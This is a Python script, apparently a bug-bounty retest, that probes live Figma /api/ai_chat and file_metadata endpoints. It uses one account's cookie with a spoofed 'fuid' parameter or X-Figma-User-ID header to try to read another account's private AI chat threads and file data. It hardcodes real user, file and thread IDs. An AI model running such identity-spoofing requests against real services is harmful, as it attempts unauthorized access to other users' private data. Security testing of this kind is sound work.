# -*- coding: utf-8 -*-
"""ai_chat fuid 参数终极重测: 绝对纯净 B cookie + fuid=随机/A (8-19)
旧报告(H1-identity-claim-authz-bypass)称 /api/ai_chat/* 信任 fuid 参数不校验 cookie
8-17 复盘: header 伪装在纯净 cookie 下 401 (绑定存在)
8-19 已验证: user/state fuid 必须∈cookie token 集合; file_metadata 随机uid 全null
最后拼图: ai_chat threads/messages 用随机 uid + 绝对纯净 B 重测
"""
import io, json, sys, urllib.error, urllib.request, urllib.parse, uuid
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"      # A 私有 make 文件
A_THREAD = "ee5997d9-bbdb-4912-9587-9022c14c0be0"  # 旧报告泄露的线程
FAKE_UID = str(uuid.uuid4())           # 随机 uid
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def clean_json_cookie_field(raw_value, keep_uid):
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None
    return urllib.parse.quote(json.dumps(nd, separators=(',', ':')))


def make_abs_pure(cookie, keep_uid):
    """authn+embed 都只留 keep_uid token 的绝对纯净 cookie"""
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    authn_raw = parts.get('__Host-figma.authn', '')
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(d, separators=(',', ':')))
    if '__Host-figma.embed' in parts:
        ne = clean_json_cookie_field(parts['__Host-figma.embed'], keep_uid)
        if ne:
            parts['__Host-figma.embed'] = ne
        else:
            del parts['__Host-figma.embed']
            parts.pop('__Host-figma.embed.mac', None)
    return '; '.join(f'{k}={v}' for k, v in parts.items())


def load(p):
    return io.open(p, encoding='utf-8').read().strip().replace('\n', '; ')


rawA = load('ws_cookie_A_new.txt')
rawB = load('ws_cookie_B_new.txt')
ABS_B = make_abs_pure(rawB, B_UID)
ABS_A = make_abs_pure(rawA, A_UID)


def call(label, path, cookie, uid_header=None, fuid=None, query=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": cookie}
    if uid_header:
        headers["X-Figma-User-ID"] = uid_header
    url = BASE + path
    q = dict(query or {})
    if fuid is not None:
        q["fuid"] = fuid
    if q:
        url += "?" + urllib.parse.urlencode(q)
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:450]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:450]}")
        return e.code, raw


def section(t):
    print("\n" + "=" * 68)
    print(t)
    print("=" * 68)


THREADS_Q = {"owner_id": A_MAKE, "owner_type": "file"}

section(f"1. threads · A私有make · fuid=随机({FAKE_UID[:8]}...) ⭐终极")
call("纯净B fuid=随机", "/api/ai_chat/threads", ABS_B, fuid=FAKE_UID, query=THREADS_Q)
call("原始B fuid=随机", "/api/ai_chat/threads", rawB, fuid=FAKE_UID, query=THREADS_Q)

section("2. threads · fuid=A (纯净 vs 原始 对照)")
call("纯净B fuid=A", "/api/ai_chat/threads", ABS_B, fuid=A_UID, query=THREADS_Q)
call("原始B fuid=A", "/api/ai_chat/threads", rawB, fuid=A_UID, query=THREADS_Q)

section("3. threads · X-Figma-User-ID 头 (对照)")
call("纯净B header=A", "/api/ai_chat/threads", ABS_B, uid_header=A_UID, query=THREADS_Q)
call("纯净B header=随机", "/api/ai_chat/threads", ABS_B, uid_header=FAKE_UID, query=THREADS_Q)
call("原始B header=A", "/api/ai_chat/threads", rawB, uid_header=A_UID, query=THREADS_Q)

section("4. threads · 基线 (owner 对照)")
call("纯净A header=A", "/api/ai_chat/threads", ABS_A, uid_header=A_UID, query=THREADS_Q)
call("纯净A fuid=A", "/api/ai_chat/threads", ABS_A, fuid=A_UID, query=THREADS_Q)

section(f"5. messages · 旧报告泄露的线程 · fuid=随机 ⭐终极")
MSG_Q = {"owner_id": A_MAKE, "owner_type": "file"}
call("纯净B fuid=随机", f"/api/ai_chat/messages/{A_THREAD}", ABS_B, fuid=FAKE_UID, query=MSG_Q)
call("原始B fuid=随机", f"/api/ai_chat/messages/{A_THREAD}", rawB, fuid=FAKE_UID, query=MSG_Q)
call("纯净B fuid=A", f"/api/ai_chat/messages/{A_THREAD}", ABS_B, fuid=A_UID, query=MSG_Q)
call("原始B fuid=A", f"/api/ai_chat/messages/{A_THREAD}", rawB, fuid=A_UID, query=MSG_Q)

section("6. file_metadata · 随机uid (旧报告第2步复现)")
call("纯净B header=随机", f"/api/file_metadata/{A_MAKE}", ABS_B, uid_header=FAKE_UID)
call("原始B header=随机", f"/api/file_metadata/{A_MAKE}", rawB, uid_header=FAKE_UID)
call("纯净B header=A", f"/api/file_metadata/{A_MAKE}", ABS_B, uid_header=A_UID)

print("\n" + "=" * 68)
print("判定: fuid=随机 任一 200 且含真实数据(owner/线程列表) = 漏洞存活")
print("      fuid=随机 403/401/空壳/null = 已修复或从未存在(多账号假阳性)")
print("=" * 68)
